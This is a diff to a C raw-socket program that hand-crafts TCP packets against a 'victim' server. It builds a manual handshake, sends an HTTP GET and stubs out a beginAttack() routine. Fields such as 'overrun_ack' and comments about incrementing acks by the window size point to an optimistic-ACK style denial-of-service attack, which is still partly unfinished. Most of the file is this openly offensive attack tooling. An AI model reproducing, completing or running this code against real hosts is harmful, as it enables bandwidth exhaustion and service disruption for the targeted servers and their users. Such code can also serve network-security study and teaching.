@@ -1,8 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <errno.h>
-#include <string.h> //memset()
-#include <unistd.h> //sleep()
+#include <string.h>
+#include <unistd.h>
 
 //Socket stuff
 #include <sys/socket.h>
@@ -41,7 +41,7 @@ struct victim_connection {
   unsigned send_seq;       // the sequence we are using to send...this shouldn't change after the handshake
   unsigned overrun_ack;    // stores the ack that was overrun
   unsigned is_done;        // if a fin packet was received, it will be 1
-  unsigned window;         // the current window size
+  unsigned short window;         // the current window size
 };
 
 // TODO I DONT THINK THIS IS NECESSARY
@@ -91,13 +91,13 @@ int send_packet(int socket,
                 struct victim_connection *m_connection,
                 unsigned seq_nbr,
                 unsigned ack_nbr,
-                int is_ack,
                 void* content,
                 unsigned content_length,
                 char syn,
                 char fin,
                 char rst,
-                int window,
+                char is_ack,
+                unsigned short window,
                 int w_scale) {
     // TODO implement send packet to construct the packet and send
     // it based to the provided socket
@@ -129,20 +129,28 @@ int send_packet(int socket,
     data = (char *) (packet + sizeof(struct tcphdr));
     memcpy(data, content, content_length);
 
-    unsigned long one = 1;
-
     //Populate tcpHdr
     // TODO WHAT IS THE SOURCE PORT
     tcpHdr->source = htons(6); //16 bit in nbp format of source port
     tcpHdr->dest = htons(m_connection->dst_port); //16 bit in nbp format of destination port
-    tcpHdr->seq = htonl(seq_nbr % (one<<32)); //32 bit sequence number, initially set to zero
-    tcpHdr->ack_seq = htonl(ack_nbr);// TODO % (1<<32); //32 bit ack sequence number, depends whether ACK is set or not
+    tcpHdr->seq = htonl(seq_nbr); //32 bit sequence number, initially set to zero
+
+    if (is_ack) {
+      tcpHdr-> ack = 1;
+      printf("Sending an ack: %u\n", ack_nbr);
+      tcpHdr->ack_seq = htonl((unsigned)ack_nbr); //32 bit ack sequence number, depends whether ACK is set or not
+
+    } else {
+      printf("Not sending an ack %u\n", ack_nbr);
+      tcpHdr->ack = 0;
+      tcpHdr->ack_seq = 0;
+    }
+
     tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
     tcpHdr->res1 = 0; //4 bits: Not used
     tcpHdr->cwr = 0; //Congestion control mechanism
     tcpHdr->ece = 0; //Congestion control mechanism
     tcpHdr->urg = 0; //Urgent flag
-    tcpHdr->ack = is_ack; //Acknownledge
     tcpHdr->psh = 0; //Push data immediately
     tcpHdr->rst = rst; //RST flag
     tcpHdr->syn = syn; //SYN flag
@@ -188,17 +196,15 @@ int send_packet(int socket,
 
 }
 
-int read_packet(struct victim_connection *m_victim, int sock) {
+unsigned read_packet(struct victim_connection *m_victim, int sock) {
     // TODO keep reading the socket for a relevent ip
     // update the sequence number
 
     while (1) {
-    // TODO TECHNICALLY THE MAX PACKET SIZE FOR TCP IS 65535
-      char buff[MSS];
-      if (recvfrom(sock, buff, MSS, 0, NULL, NULL) < 0) {
+      char buff[65535];
+      if (recvfrom(sock, buff, 65535, 0, NULL, NULL) < 0) {
         perror("Error on recv()");
       } else {
-      // TODO WE SHOULD PARSE THE RESPONSE HERE
         struct sockaddr_in source_socket_address, dest_socket_address;
         struct iphdr *ip_packet = (struct iphdr *) buff;
         memset(&source_socket_address, 0, sizeof(source_socket_address));
@@ -228,30 +234,31 @@ int read_packet(struct victim_connection *m_victim, int sock) {
 }
 
 void handshake(struct victim_connection *m_victim, int sock) {
-    // TODO IMPLEMENT
 	unsigned send_seq = 256; //TODO random
-    unsigned ack_nbr=1;
-    int is_ack = 0;
+    long ack_nbr=-1;
     void* content = "";
     unsigned content_length = 0;
     char syn = 0;
     char fin = 0;
     char rst = 0;
-    int window = 5840;
+    unsigned short window = 5840;
     int w_scale = 0;
-	send_packet(sock,m_victim,send_seq,ack_nbr,is_ack,
-				content,content_length,1,fin,rst,
+	send_packet(sock,m_victim,send_seq,ack_nbr,
+				content,content_length,1,fin,rst,0,
 				window,w_scale);
 	unsigned read_seq = read_packet(m_victim, sock);
-  printf("Received packet with sequence num: %u", read_seq);
+  printf("Received packet with sequence num: %u\n", read_seq);
   send_seq +=1;
-	ack_nbr = read_seq+1;
-	send_packet(sock,m_victim,send_seq,ack_nbr,1,
-				content,content_length,syn,fin,rst,
+  ack_nbr = 0;
+	ack_nbr = (long)read_seq+1;
+  printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
+	send_packet(sock,m_victim,send_seq,ack_nbr,
+				content,content_length,syn,fin,rst,1,
 				window,w_scale);
 	content="GET / HTTP/1.0\r\n\r\n";
-	send_packet(sock,m_victim,send_seq,ack_nbr,1,
-				content,strlen(content),syn,fin,rst,
+  content_length = strlen(content);
+	send_packet(sock,m_victim,send_seq,ack_nbr,
+				content,content_length,syn,fin,rst,1,
 				window,w_scale);
 	m_victim->send_seq = send_seq + content_length;
 
@@ -293,6 +300,14 @@ int beginAttack() {
     // for each connection increment the ack by the window size
 
     // increase the window size by mss as long as its less than the max
+
+    // Cleanup
+
+
+    send_packet(sock,&m_victim,m_victim.send_seq,-1,
+      "",0,0,1,0,0,
+      5840,0);
+
     close(sock);
 }
 
